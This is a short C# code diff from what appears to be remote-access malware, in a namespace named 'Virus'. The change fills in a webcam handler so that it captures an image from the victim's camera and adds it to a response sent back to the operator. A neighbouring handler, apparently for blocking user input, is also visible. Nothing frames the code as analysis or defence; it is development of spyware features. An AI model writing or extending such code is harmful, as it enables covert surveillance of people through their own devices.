@@ -120,7 +120,7 @@ namespace Virus {
         }
 
         private void webcam(string s) {
-            
+            ResponseBuilder.webcam(Webcam.GetImage());
         }
 
         private void blockinputs(string s) {
